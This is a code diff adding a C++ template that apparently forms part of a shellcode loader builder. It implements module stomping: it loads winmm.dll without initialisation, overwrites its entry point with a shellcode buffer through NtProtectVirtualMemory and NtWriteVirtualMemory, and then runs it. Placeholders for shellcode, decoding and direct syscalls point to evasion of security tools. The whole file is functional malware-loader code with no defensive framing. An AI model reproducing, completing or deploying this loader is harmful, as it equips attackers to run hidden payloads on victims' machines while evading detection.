@@ -1,0 +1,147 @@
+#include <iostream>
+#include <windows.h>
+#include <psapi.h>
+#include <tlhelp32.h>
+#include <stdlib.h>
+#include <tchar.h>
+#include <string>
+
+
+//####INCLUDE####
+
+//####DEFINE####
+
+//####CODE####
+
+typedef HMODULE (WINAPI *pLoadLibraryExW)(
+    LPCWSTR lpLibFileName,
+    HANDLE hFile,
+    DWORD dwFlags
+);
+
+// Define NTSTATUS if not already defined
+#ifndef NTSTATUS
+typedef LONG NTSTATUS;
+#endif
+
+// Define DONT_RESOLVE_DLL_REFERENCES if not already defined
+#ifndef DONT_RESOLVE_DLL_REFERENCES
+#define DONT_RESOLVE_DLL_REFERENCES 0x00000001
+#endif
+
+DWORD WINAPI esc_main(LPVOID lpParameter)
+{
+    unsigned char encoded[] = ####SHELLCODE####;
+    SIZE_T length = sizeof(encoded);
+
+
+    //####CALL####
+    unsigned char* decoded = encoded;
+
+
+
+    // Get handle to kernel32.dll to use LoadLibraryExW
+    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
+    if (!hKernel32) {
+        std::cerr << "Failed to get handle to kernel32.dll" << std::endl;
+        return 1;
+    }
+
+    pLoadLibraryExW LoadLibraryExW = (pLoadLibraryExW)GetProcAddress(hKernel32, "LoadLibraryExW");
+    if (!LoadLibraryExW) {
+        std::cerr << "Failed to get address of LoadLibraryExW" << std::endl;
+        return 1;
+    }
+
+    // Choose a DLL to stomp - using a non-critical DLL
+    const wchar_t* dllToStomp = L"winmm.dll";
+    
+    std::cout << "Loading a fresh copy of the DLL for stomping..." << std::endl;
+    
+    // Load a fresh copy of the DLL with DONT_RESOLVE_DLL_REFERENCES flag
+    // This loads the DLL but doesn't execute its initialization routines
+    HMODULE hModule = LoadLibraryExW(dllToStomp, NULL, DONT_RESOLVE_DLL_REFERENCES);
+    
+    if (!hModule) {
+        std::cerr << "Failed to load module for stomping. Error: " << GetLastError() << std::endl;
+        return 1;
+    }
+
+    // Get module information
+    MODULEINFO moduleInfo;
+    if (!GetModuleInformation(GetCurrentProcess(), hModule, &moduleInfo, sizeof(moduleInfo))) {
+        std::cerr << "Failed to get module information. Error: " << GetLastError() << std::endl;
+        FreeLibrary(hModule);
+        return 1;
+    }
+
+    std::cout << "Successfully loaded module at address: 0x" << std::hex << moduleInfo.lpBaseOfDll << std::endl;
+    std::cout << "Module size: " << std::dec << moduleInfo.SizeOfImage << " bytes" << std::endl;
+
+    // Find the .text section to overwrite
+    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleInfo.lpBaseOfDll;
+    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((BYTE*)moduleInfo.lpBaseOfDll + dosHeader->e_lfanew);
+    
+    // Find the entry point
+    PVOID targetAddress = (PVOID)((BYTE*)moduleInfo.lpBaseOfDll + ntHeader->OptionalHeader.AddressOfEntryPoint);
+    
+    // If entry point is not suitable, use a fixed offset
+    if (!targetAddress) {
+        targetAddress = (PVOID)((BYTE*)moduleInfo.lpBaseOfDll + 0x1000); // Skip PE header
+    }
+
+    std::cout << "Target address for stomping: 0x" << std::hex << targetAddress << std::endl;
+
+    // Change memory protection to allow writing
+    //####SYSCALL####
+    HANDLE hProc = GetCurrentProcess();
+    DWORD oldProtect = 0;
+    PVOID baseAddress = targetAddress;
+    SIZE_T regionSize = length;
+    NTSTATUS status;
+
+    status = NtProtectVirtualMemory(hProc, &baseAddress, &regionSize, PAGE_READWRITE, &oldProtect);
+    if (status != 0) {
+        std::cerr << "NtProtectVirtualMemory failed with status: " << std::hex << status << std::endl;
+        FreeLibrary(hModule);
+        return 1;
+    }
+
+    // Write shellcode to the module's memory
+    SIZE_T bytesWritten = 0;
+    status = NtWriteVirtualMemory(hProc, targetAddress, decoded, length, &bytesWritten);
+    if (status != 0) {
+        std::cerr << "NtWriteVirtualMemory failed with status: " << std::hex << status << std::endl;
+        FreeLibrary(hModule);
+        return 1;
+    }
+
+    std::cout << "Successfully wrote " << std::dec << bytesWritten << " bytes to the module" << std::endl;
+
+    // Restore original memory protection
+    status = NtProtectVirtualMemory(hProc, &baseAddress, &regionSize, PAGE_EXECUTE_READ, &oldProtect);
+    if (status != 0) {
+        std::cerr << "Failed to restore memory protection. Status: " << std::hex << status << std::endl;
+        FreeLibrary(hModule);
+        return 1;
+    }
+
+    std::cout << "Executing stomped module code..." << std::endl;
+
+    // Execute the shellcode
+    FARPROC stomped_func = (FARPROC)targetAddress;
+    stomped_func();
+
+    std::cout << "Execution completed" << std::endl;
+    
+    // Optionally free the library when done
+    // FreeLibrary(hModule);
+    
+    return 0;
+}
+
+int main()
+{
+    esc_main(NULL);
+    return 0;
+} 
